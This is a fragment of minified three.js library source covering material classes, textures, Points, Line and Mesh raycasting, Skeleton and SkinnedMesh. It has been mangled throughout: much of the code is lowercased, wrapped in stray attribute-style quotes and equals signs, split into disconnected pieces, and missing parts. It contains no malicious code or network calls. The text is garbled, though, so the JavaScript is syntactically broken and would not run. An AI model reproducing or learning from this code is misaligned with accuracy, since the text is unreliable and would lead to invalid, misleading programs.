three.color(16777215);this.aomap=\"this.map=null;this.aoMapIntensity=1;this.envMap=this.alphaMap=this.specularMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.lights=this.morphTargets=this.skinning=!1;this.setValues(a)};\" three.meshbasicmaterial.prototype=\"Object.create(THREE.Material.prototype);THREE.MeshBasicMaterial.prototype.constructor=THREE.MeshBasicMaterial;\" three.meshbasicmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;\" this.skinning=\"a.skinning;this.morphTargets=a.morphTargets;return\" this};three.meshdepthmaterial=\"function(a){THREE.Material.call(this);this.type=\"MeshDepthMaterial\";this.depthPacking=THREE.BasicDepthPacking;this.morphTargets=this.skinning=!1;this.displacementMap=this.alphaMap=this.map=null;this.displacementScale=1;this.displacementBias=0;this.wireframe=!1;this.wireframeLinewidth=1;this.lights=this.fog=!1;this.setValues(a)};THREE.MeshDepthMaterial.prototype=Object.create(THREE.Material.prototype);\" three.meshdepthmaterial.prototype.constructor=\"THREE.MeshDepthMaterial;THREE.MeshDepthMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.depthPacking=a.depthPacking;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.map=a.map;this.alphaMap=a.alphaMap;this.displacementMap=a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;return\" three.meshlambertmaterial=\"function(a){THREE.Material.call(this);this.type=\"MeshLambertMaterial\";this.color=new\" three.color(16777215);this.lightmap=\"this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new\" three.color(0);this.emissiveintensity=\"1;this.envMap=this.alphaMap=this.specularMap=this.emissiveMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\" \"round\";this.morphnormals=\"this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshLambertMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshLambertMaterial.prototype.constructor=THREE.MeshLambertMaterial;\" three.meshlambertmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=\" a.refractionratio;this.wireframe=\"a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return\" this};three.meshnormalmaterial=\"function(a){THREE.Material.call(this,a);this.type=\"MeshNormalMaterial\";this.wireframe=!1;this.wireframeLinewidth=1;this.morphTargets=this.lights=this.fog=!1;this.setValues(a)};\" three.meshnormalmaterial.prototype=\"Object.create(THREE.Material.prototype);THREE.MeshNormalMaterial.prototype.constructor=THREE.MeshNormalMaterial;THREE.MeshNormalMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;return\" three.meshphongmaterial=\"function(a){THREE.Material.call(this);this.type=\"MeshPhongMaterial\";this.color=new\" three.color(16777215);this.specular=\"new\" three.color(1118481);this.shininess=\"30;this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new\" three.vector2(1,1);this.displacementmap=\"null;this.displacementScale=1;this.displacementBias=\" 0;this.envmap=\"this.alphaMap=this.specularMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshPhongMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshPhongMaterial.prototype.constructor=THREE.MeshPhongMaterial;\" three.meshphongmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.specular.copy(a.specular);this.shininess=a.shininess;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=a.normalMap;this.normalScale.copy(a.normalScale);\" this.displacementmap=\"a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;\" this.morphnormals=\"a.morphNormals;return\" three.meshstandardmaterial=\"function(a){THREE.Material.call(this);this.defines={STANDARD:\"\"};this.type=\"MeshStandardMaterial\";this.color=new\" three.color(16777215);this.metalness=\"this.roughness=.5;this.lightMap=this.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.emissive=new\" 1;this.displacementbias=\"0;this.envMap=this.alphaMap=this.metalnessMap=this.roughnessMap=null;this.envMapIntensity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.morphNormals=this.morphTargets=this.skinning=!1;this.setValues(a)};THREE.MeshStandardMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshStandardMaterial.prototype.constructor=THREE.MeshStandardMaterial;\" three.meshstandardmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.defines={STANDARD:\"\"};this.color.copy(a.color);this.roughness=a.roughness;this.metalness=a.metalness;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=\" a.normalmap;this.normalscale.copy(a.normalscale);this.displacementmap=\"a.displacementMap;this.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.roughnessMap=a.roughnessMap;this.metalnessMap=a.metalnessMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.envMapIntensity=a.envMapIntensity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;\" this};three.meshphysicalmaterial=\"function(a){THREE.MeshStandardMaterial.call(this);this.defines={PHYSICAL:\"\"};this.type=\"MeshPhysicalMaterial\";this.reflectivity=.5;this.clearCoatRoughness=this.clearCoat=0;this.setValues(a)};THREE.MeshPhysicalMaterial.prototype=Object.create(THREE.MeshStandardMaterial.prototype);THREE.MeshPhysicalMaterial.prototype.constructor=THREE.MeshPhysicalMaterial;\" three.meshphysicalmaterial.prototype.copy=\"function(a){THREE.MeshStandardMaterial.prototype.copy.call(this,a);this.defines={PHYSICAL:\"\"};this.reflectivity=a.reflectivity;this.clearCoat=a.clearCoat;this.clearCoatRoughness=a.clearCoatRoughness;return\" this};three.multimaterial=\"function(a){this.uuid=THREE.Math.generateUUID();this.type=\"MultiMaterial\";this.materials=a\" instanceof=\"\" array?a:[];this.visible=\"!0};\" three.multimaterial.prototype=\"{constructor:THREE.MultiMaterial,toJSON:function(a){for(var\" f=\"c[d].toJSON(a);delete\" f.metadata;b.materials.push(f)}b.visible=\"this.visible;return\" b},clone:function(){for(var=\"\" this.constructor,b=\"0;b<this.materials.length;b++)a.materials.push(this.materials[b].clone());a.visible=this.visible;return\" a}};=\"\" three.pointsmaterial=\"function(a){THREE.Material.call(this);this.type=\"PointsMaterial\";this.color=new\" three.color(16777215);this.map=\"null;this.size=1;this.sizeAttenuation=!0;this.lights=!1;this.setValues(a)};THREE.PointsMaterial.prototype=Object.create(THREE.Material.prototype);THREE.PointsMaterial.prototype.constructor=THREE.PointsMaterial;\" three.pointsmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.size=a.size;this.sizeAttenuation=a.sizeAttenuation;return\" three.shadermaterial=\"function(a){THREE.Material.call(this);this.type=\"ShaderMaterial\";this.defines={};this.uniforms={};this.vertexShader=\"void\" main()=\"\" {\\n\\tgl_position=\"projectionMatrix\" *=\"\" modelviewmatrix=\"\" vec4(=\"\" position,=\"\" 1.0=\"\" );\\n}\";this.fragmentshader=\"void main() {\\n\\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\\n}\" ;this.linewidth=\"1;this.wireframe=!1;this.wireframeLinewidth=1;this.morphNormals=this.morphTargets=this.skinning=this.clipping=this.lights=this.fog=!1;this.extensions={derivatives:!1,fragDepth:!1,\" drawbuffers:!1,shadertexturelod:!1};this.defaultattributevalues=\"{color:[1,1,1],uv:[0,0],uv2:[0,0]};this.index0AttributeName=void\" 0;void=\"\" 0!=\"=a&&(void\" attributes=\"\" should=\"\" now=\"\" be=\"\" defined=\"\" in=\"\" three.buffergeometry=\"\" instead.\"),this.setvalues(a))};three.shadermaterial.prototype=\"Object.create(THREE.Material.prototype);THREE.ShaderMaterial.prototype.constructor=THREE.ShaderMaterial;\" three.shadermaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.fragmentShader=a.fragmentShader;this.vertexShader=a.vertexShader;this.uniforms=THREE.UniformsUtils.clone(a.uniforms);this.defines=a.defines;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.lights=a.lights;this.clipping=a.clipping;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;this.extensions=a.extensions;return\" three.shadermaterial.prototype.tojson=\"function(a){a=THREE.Material.prototype.toJSON.call(this,a);a.uniforms=this.uniforms;a.vertexShader=this.vertexShader;a.fragmentShader=this.fragmentShader;return\" a};three.rawshadermaterial=\"function(a){THREE.ShaderMaterial.call(this,a);this.type=\"RawShaderMaterial\"};THREE.RawShaderMaterial.prototype=Object.create(THREE.ShaderMaterial.prototype);THREE.RawShaderMaterial.prototype.constructor=THREE.RawShaderMaterial;\" three.spritematerial=\"function(a){THREE.Material.call(this);this.type=\"SpriteMaterial\";this.color=new\" three.shadowmaterial=\"function(){THREE.ShaderMaterial.call(this,{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.lights,{opacity:{value:1}}]),vertexShader:THREE.ShaderChunk.shadow_vert,fragmentShader:THREE.ShaderChunk.shadow_frag});this.transparent=this.lights=!0;Object.defineProperties(this,{opacity:{enumerable:!0,get:function(){return\" this.uniforms.opacity.value},set:function(a){this.uniforms.opacity.value=\"a}}})};THREE.ShadowMaterial.prototype=Object.create(THREE.ShaderMaterial.prototype);\" three.shadowmaterial.prototype.constructor=\"THREE.ShadowMaterial;\" three.texture=\"function(a,b,c,d,e,f,g,h,k,l){Object.defineProperty(this,\"id\",{value:THREE.TextureIdCount++});this.uuid=THREE.Math.generateUUID();this.sourceFile=this.name=\"\";this.image=void\" this.anisotropy=\"void\" three.vector2(0,0);this.repeat=\"new\" three.vector2(1,1);this.generatemipmaps=\"!0;this.premultiplyAlpha=!1;this.flipY=!0;this.unpackAlignment=4;this.encoding=void\" 0;three.texture.default_mapping=\"THREE.UVMapping;\" three.texture.prototype=\"{constructor:THREE.Texture,set\" needsupdate(a){!0=\"==a&&this.version++},clone:function(){return(new\" this.constructor).copy(this)},copy:function(a){this.image=\"a.image;this.mipmaps=a.mipmaps.slice(0);this.mapping=a.mapping;this.wrapS=a.wrapS;this.wrapT=a.wrapT;this.magFilter=a.magFilter;this.minFilter=a.minFilter;this.anisotropy=a.anisotropy;this.format=a.format;this.type=a.type;this.offset.copy(a.offset);this.repeat.copy(a.repeat);this.generateMipmaps=a.generateMipmaps;this.premultiplyAlpha=\" a.premultiplyalpha;this.flipy=\"a.flipY;this.unpackAlignment=a.unpackAlignment;this.encoding=a.encoding;return\" this},tojson:function(a){if(void=\"\" a.textures[this.uuid];var=\"\" if(void=\"\" d=\"a.images,e=c.uuid,f=c.uuid,g;void\" a.textures[this.uuid]=\"b},dispose:function(){this.dispatchEvent({type:\"dispose\"})},\" transformuv:function(a){if(this.mapping=\"==THREE.UVMapping){a.multiply(this.repeat);a.add(this.offset);if(0\">a.x||1<a.x)switch(this.wraps){case three.repeatwrapping:a.x-=\"Math.floor(a.x);break;case\" three.clamptoedgewrapping:a.x=\"0\">a.x?0:1;break;case THREE.MirroredRepeatWrapping:1===Math.abs(Math.floor(a.x)%2)?a.x=Math.ceil(a.x)-a.x:a.x-=Math.floor(a.x)}if(0>a.y||1<a.y)switch(this.wrapt){case three.repeatwrapping:a.y-=\"Math.floor(a.y);break;case\" three.clamptoedgewrapping:a.y=\"0\">a.y?0:1;break;case THREE.MirroredRepeatWrapping:1===\nMath.abs(Math.floor(a.y)%2)?a.y=Math.ceil(a.y)-a.y:a.y-=Math.floor(a.y)}this.flipY&&(a.y=1-a.y)}}};Object.assign(THREE.Texture.prototype,THREE.EventDispatcher.prototype);THREE.TextureIdCount=0;\nTHREE.DepthTexture=function(a,b,c,d,e,f,g,h,k){THREE.Texture.call(this,null,d,e,f,g,h,THREE.DepthFormat,c,k);this.image={width:a,height:b};this.type=void 0!==c?c:THREE.UnsignedShortType;this.magFilter=void 0!==g?g:THREE.NearestFilter;this.minFilter=void 0!==h?h:THREE.NearestFilter;this.generateMipmaps=this.flipY=!1};THREE.DepthTexture.prototype=Object.create(THREE.Texture.prototype);THREE.DepthTexture.prototype.constructor=THREE.DepthTexture;\nTHREE.CanvasTexture=function(a,b,c,d,e,f,g,h,k){THREE.Texture.call(this,a,b,c,d,e,f,g,h,k);this.needsUpdate=!0};THREE.CanvasTexture.prototype=Object.create(THREE.Texture.prototype);THREE.CanvasTexture.prototype.constructor=THREE.CanvasTexture;THREE.CubeTexture=function(a,b,c,d,e,f,g,h,k,l){a=void 0!==a?a:[];b=void 0!==b?b:THREE.CubeReflectionMapping;THREE.Texture.call(this,a,b,c,d,e,f,g,h,k,l);this.flipY=!1};THREE.CubeTexture.prototype=Object.create(THREE.Texture.prototype);\nTHREE.CubeTexture.prototype.constructor=THREE.CubeTexture;Object.defineProperty(THREE.CubeTexture.prototype,\"images\",{get:function(){return this.image},set:function(a){this.image=a}});THREE.CompressedTexture=function(a,b,c,d,e,f,g,h,k,l,n,p){THREE.Texture.call(this,null,f,g,h,k,l,d,e,n,p);this.image={width:b,height:c};this.mipmaps=a;this.generateMipmaps=this.flipY=!1};THREE.CompressedTexture.prototype=Object.create(THREE.Texture.prototype);THREE.CompressedTexture.prototype.constructor=THREE.CompressedTexture;\nTHREE.DataTexture=function(a,b,c,d,e,f,g,h,k,l,n,p){THREE.Texture.call(this,null,f,g,h,k,l,d,e,n,p);this.image={data:a,width:b,height:c};this.magFilter=void 0!==k?k:THREE.NearestFilter;this.minFilter=void 0!==l?l:THREE.NearestFilter;this.generateMipmaps=this.flipY=!1};THREE.DataTexture.prototype=Object.create(THREE.Texture.prototype);THREE.DataTexture.prototype.constructor=THREE.DataTexture;\nTHREE.VideoTexture=function(a,b,c,d,e,f,g,h,k){function l(){requestAnimationFrame(l);a.readyState>=a.HAVE_CURRENT_DATA&&(n.needsUpdate=!0)}THREE.Texture.call(this,a,b,c,d,e,f,g,h,k);this.generateMipmaps=!1;var n=this;l()};THREE.VideoTexture.prototype=Object.create(THREE.Texture.prototype);THREE.VideoTexture.prototype.constructor=THREE.VideoTexture;THREE.Group=function(){THREE.Object3D.call(this);this.type=\"Group\"};THREE.Group.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Group});\nTHREE.Points=function(a,b){THREE.Object3D.call(this);this.type=\"Points\";this.geometry=void 0!==a?a:new THREE.BufferGeometry;this.material=void 0!==b?b:new THREE.PointsMaterial({color:16777215*Math.random()})};\nTHREE.Points.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Points,raycast:function(){var a=new THREE.Matrix4,b=new THREE.Ray,c=new THREE.Sphere;return function(d,e){function f(a,c){var f=b.distanceSqToPoint(a);if(f<n){var h=\"b.closestPointToPoint(a);h.applyMatrix4(k);var\" m=\"d.ray.origin.distanceTo(h);m<d.near||m\">d.far||e.push({distance:m,distanceToRay:Math.sqrt(f),point:h.clone(),index:c,face:null,object:g})}}var g=this,h=this.geometry,k=this.matrixWorld,l=d.params.Points.threshold;\nnull===h.boundingSphere&&h.computeBoundingSphere();c.copy(h.boundingSphere);c.applyMatrix4(k);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(k);b.copy(d.ray).applyMatrix4(a);var l=l/((this.scale.x+this.scale.y+this.scale.z)/3),n=l*l,l=new THREE.Vector3;if(h instanceof THREE.BufferGeometry){var p=h.index,h=h.attributes.position.array;if(null!==p)for(var m=p.array,p=0,q=m.length;p<q;p++){var r=\"m[p];l.fromArray(h,3*r);f(l,r)}else\" for(p=\"0,m=h.length/3;p<m;p++)l.fromArray(h,3*p),f(l,p)}else\" for(l=\"h.vertices,\" p=\"0,m=l.length;p<m;p++)f(l[p],p)}}}(),clone:function(){return(new\" this.constructor(this.geometry,this.material)).copy(this)}});three.line=\"function(a,b,c){if(1===c)return\" console.warn(\"three.line:=\"\" parameter=\"\" three.linepieces=\"\" no=\"\" longer=\"\" supported.=\"\" created=\"\" three.linesegments=\"\" instead.\"),new=\"\" three.linesegments(a,b);three.object3d.call(this);this.type=\"Line\" ;this.geometry=\"void\" 0!=\"=a?a:new\" three.buffergeometry;this.material=\"void\" three.linebasicmaterial({color:16777215*math.random()})};=\"\" three.line.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Line,raycast:function(){var\" a=\"new\" three.matrix4,b=\"new\" three.ray,c=\"new\" three.sphere;return=\"\" function(d,e){var=\"\" f=\"d.linePrecision,f=f*f,g=this.geometry,h=this.matrixWorld;null===g.boundingSphere&&g.computeBoundingSphere();c.copy(g.boundingSphere);c.applyMatrix4(h);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(h);b.copy(d.ray).applyMatrix4(a);var\" k=\"new\" three.vector3,l=\"new\" three.vector3,h=\"new\" three.vector3,n=\"new\" three.vector3,p=\"this\" instanceof=\"\" three.linesegments?2:1;if(g=\"\" three.buffergeometry){var=\"\" m=\"g.index,q=g.attributes.position.array;if(null!==m)for(var\" s=\"m[g+1];k.fromArray(q,3*m[g]);l.fromArray(q,3*s);s=b.distanceSqToSegment(k,l,n,h);s\">f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||e.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else for(g=0,r=\nq.length/3-1;g<r;g+=p)k.fromarray(q,3*g),l.fromarray(q,3*g+3),s=b.distancesqtosegment(k,l,n,h),s>f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||e.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else if(g instanceof THREE.Geometry)for(k=g.vertices,l=k.length,g=0;g<l-1;g+=p)s=b.distancesqtosegment(k[g],k[g+1],n,h),s>f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||\ne.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});THREE.LineSegments=function(a,b){THREE.Line.call(this,a,b);this.type=\"LineSegments\"};THREE.LineSegments.prototype=Object.assign(Object.create(THREE.Line.prototype),{constructor:THREE.LineSegments});\nTHREE.Mesh=function(a,b){THREE.Object3D.call(this);this.type=\"Mesh\";this.geometry=void 0!==a?a:new THREE.BufferGeometry;this.material=void 0!==b?b:new THREE.MeshBasicMaterial({color:16777215*Math.random()});this.drawMode=THREE.TrianglesDrawMode;this.updateMorphTargets()};\nTHREE.Mesh.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Mesh,setDrawMode:function(a){this.drawMode=a},copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.drawMode=a.drawMode;return this},updateMorphTargets:function(){if(void 0!==this.geometry.morphTargets&&0<this.geometry.morphtargets.length){this.morphtargetbase=-1;this.morphtargetinfluences=[];this.morphtargetdictionary={};for(var a=\"0,b=this.geometry.morphTargets.length;a<b;a++)this.morphTargetInfluences.push(0),\" this.morphtargetdictionary[this.geometry.morphtargets[a].name]=\"a}},getMorphTargetIndexByName:function(a){if(void\" 0!=\"=this.morphTargetDictionary[a])return\" this.morphtargetdictionary[a];console.warn(\"three.mesh.getmorphtargetindexbyname:=\"\" morph=\"\" target=\"\" \"+a+\"=\"\" does=\"\" not=\"\" exist.=\"\" returning=\"\" 0.\");return=\"\" 0},raycast:function(){function=\"\" a(a,b,c,d,e,g,f){three.triangle.barycoordfrompoint(a,b,c,d,s);e.multiplyscalar(s.x);g.multiplyscalar(s.y);f.multiplyscalar(s.z);e.add(g).add(f);return=\"\" e.clone()}function=\"\" b(a,b,c,=\"\" d,e,g,f){var=\"\" h=\"a.material;if(null===(h.side===THREE.BackSide?c.intersectTriangle(g,e,d,!0,f):c.intersectTriangle(d,e,g,h.side!==THREE.DoubleSide,f)))return\" null;u.copy(f);u.applymatrix4(a.matrixworld);c=\"b.ray.origin.distanceTo(u);return\" c<b.near||c=\"\">b.far?null:{distance:c,point:u.clone(),object:a}}function c(c,d,e,f,l,p,n,s){g.fromArray(f,3*p);h.fromArray(f,3*n);k.fromArray(f,3*s);if(c=b(c,d,e,g,h,k,t))l&&(m.fromArray(l,2*p),q.fromArray(l,2*n),r.fromArray(l,2*s),c.uv=a(t,g,h,k,m,q,r)),c.face=new THREE.Face3(p,\nn,s,THREE.Triangle.normal(g,h,k)),c.faceIndex=p;return c}var d=new THREE.Matrix4,e=new THREE.Ray,f=new THREE.Sphere,g=new THREE.Vector3,h=new THREE.Vector3,k=new THREE.Vector3,l=new THREE.Vector3,n=new THREE.Vector3,p=new THREE.Vector3,m=new THREE.Vector2,q=new THREE.Vector2,r=new THREE.Vector2,s=new THREE.Vector3,t=new THREE.Vector3,u=new THREE.Vector3;return function(v,s){var w=this.geometry,u=this.material,z=this.matrixWorld;if(void 0!==u&&(null===w.boundingSphere&&w.computeBoundingSphere(),f.copy(w.boundingSphere),\nf.applyMatrix4(z),!1!==v.ray.intersectsSphere(f)&&(d.getInverse(z),e.copy(v.ray).applyMatrix4(d),null===w.boundingBox||!1!==e.intersectsBox(w.boundingBox)))){var y,A;if(w instanceof THREE.BufferGeometry){var I,B,u=w.index,z=w.attributes,w=z.position.array;void 0!==z.uv&&(y=z.uv.array);if(null!==u)for(var z=u.array,F=0,K=z.length;F<k;f+=3){if(u=z[f],i=z[f+1],b=z[f+2],a=c(this,v,e,w,y,u,i,b))a.faceindex=math.floor(f 0=\"==b)this.calculateInverses();else\" 1=\"\" 3),s.push(a)}else=\"\" for(f=\"0,K=w.length;F<K;F+=9)if(u=F/3,I=u+1,B=u+2,A=c(this,v,e,w,y,\" u,i,b))a.index=\"u,s.push(A)}else\" if(w=\"\" instanceof=\"\" three.geometry){var=\"\" p,m,z=\"u\" three.multimaterial,f=\"!0===z?u.materials:null,K=w.vertices;I=w.faces;B=w.faceVertexUvs[0];0<B.length&&(y=B);for(var\" h=\"0,L=I.length;H<L;H++){var\" o=\"I[H];A=!0===z?F[O.materialIndex]:u;if(void\" 0!=\"=A){B=K[O.a];P=K[O.b];M=K[O.c];if(!0===A.morphTargets){A=w.morphTargets;var\" n=\"this.morphTargetInfluences;g.set(0,0,0);h.set(0,0,0);k.set(0,0,0);for(var\" q=\"0,J=A.length;Q<J;Q++){var\" d=\"N[Q];if(0!==D){var\" g=\"A[Q].vertices;g.addScaledVector(l.subVectors(G[O.a],\" b),d);h.addscaledvector(n.subvectors(g[o.b],p),d);k.addscaledvector(p.subvectors(g[o.c],m),d)}}g.add(b);h.add(p);k.add(m);b=\"g;P=h;M=k}if(A=b(this,v,e,B,P,M,t))y&&(N=y[H],m.copy(N[0]),q.copy(N[1]),r.copy(N[2]),A.uv=a(t,B,P,M,m,q,r)),A.face=O,A.faceIndex=H,s.push(A)}}}}}}(),clone:function(){return(new\" this.constructor(this.geometry,this.material)).copy(this)}});three.bone=\"function(a){THREE.Object3D.call(this);this.type=\"Bone\";this.skin=a};\" three.bone.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Bone,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.skin=a.skin;return\" this}});=\"\" three.skeleton=\"function(a,b,c){this.useVertexTexture=void\" three.matrix4;a=\"a||[];this.bones=a.slice(0);this.useVertexTexture?(a=Math.sqrt(4*this.bones.length),a=THREE.Math.nextPowerOfTwo(Math.ceil(a)),this.boneTextureHeight=this.boneTextureWidth=a=Math.max(a,4),this.boneMatrices=new\" float32array(this.bonetexturewidth*this.bonetextureheight*4),this.bonetexture=\"new\" three.datatexture(this.bonematrices,this.bonetexturewidth,this.bonetextureheight,three.rgbaformat,three.floattype)):=\"\" this.bonematrices=\"new\" float32array(16*this.bones.length);if(void=\"\" if(this.bones.length=\"==b.length)this.boneInverses=b.slice(0);else\" for(console.warn(\"three.skeleton=\"\" boninverses=\"\" is=\"\" the=\"\" wrong=\"\" length.\"),this.boneinverses=\"[],b=0,a=this.bones.length;b<a;b++)this.boneInverses.push(new\" three.matrix4)};=\"\" object.assign(three.skeleton.prototype,{calculateinverses:function(){this.boneinverses=\"[];for(var\" a=\"0,b=this.bones.length;a<b;a++){var\" c=\"new\" three.matrix4;this.bones[a]&&c.getinverse(this.bones[a].matrixworld);this.boneinverses.push(c)}},pose:function(){for(var=\"\" a,b=\"0,c=this.bones.length;b<c;b++)(a=this.bones[b])&&a.matrixWorld.getInverse(this.boneInverses[b]);b=0;for(c=this.bones.length;b<c;b++)if(a=this.bones[b])a.parent\" three.bone?(a.matrix.getinverse(a.parent.matrixworld),a.matrix.multiply(a.matrixworld)):=\"\" a.matrix.copy(a.matrixworld),a.matrix.decompose(a.position,a.quaternion,a.scale)},update:function(){var=\"\" three.matrix4;return=\"\" function(){for(var=\"\" b=\"0,c=this.bones.length;b<c;b++)a.multiplyMatrices(this.bones[b]?this.bones[b].matrixWorld:this.identityMatrix,this.boneInverses[b]),a.toArray(this.boneMatrices,16*b);this.useVertexTexture&&(this.boneTexture.needsUpdate=!0)}}(),clone:function(){return\" new=\"\" three.skeleton(this.bones,this.boneinverses,this.usevertextexture)}});=\"\" three.skinnedmesh=\"function(a,b,c){THREE.Mesh.call(this,a,b);this.type=\"SkinnedMesh\";this.bindMode=\"attached\";this.bindMatrix=new\" three.matrix4;this.bindmatrixinverse=\"new\" d,e=\"0,f=this.geometry.bones.length;e<f;++e)d=this.geometry.bones[e],b=new\" three.bone(this),a.push(b),b.name=\"d.name,b.position.fromArray(d.pos),b.quaternion.fromArray(d.rotq),void\" this.geometry.bones[e],-1!=\"=d.parent&&null!==d.parent&&void\" three.skeleton(a,void=\"\" 0,c),this.matrixworld)};=\"\" three.skinnedmesh.prototype=\"Object.assign(Object.create(THREE.Mesh.prototype),{constructor:THREE.SkinnedMesh,bind:function(a,b){this.skeleton=a;void\" three.geometry)for(var=\"\" b.lengthmanhattan();infinity!=\"=c?b.multiplyScalar(c):b.set(1,0,0,0)}else\" if(this.geometry=\"\" three.buffergeometry)for(var=\"\" three.vector4,d=\"this.geometry.attributes.skinWeight,a=0;a<d.count;a++)b.x=d.getX(a),b.y=d.getY(a),b.z=d.getZ(a),b.w=d.getW(a),c=1/b.lengthManhattan(),Infinity!==c?b.multiplyScalar(c):b.set(1,0,0,0),d.setXYZW(a,b.x,b.y,b.z,b.w)},updateMatrixWorld:function(a){THREE.Mesh.prototype.updateMatrixWorld.call(this,!0);\"attached\"===this.bindMode?this.bindMatrixInverse.getInverse(this.matrixWorld):\" \"detached\"=\"==this.bindMode?this.bindMatrixInverse.getInverse(this.bindMatrix):console.warn(\"THREE.SkinnedMesh\" unrecognized=\"\" bindmode:=\"\" \"+this.bindmode)},clone:function(){return(new=\"\" 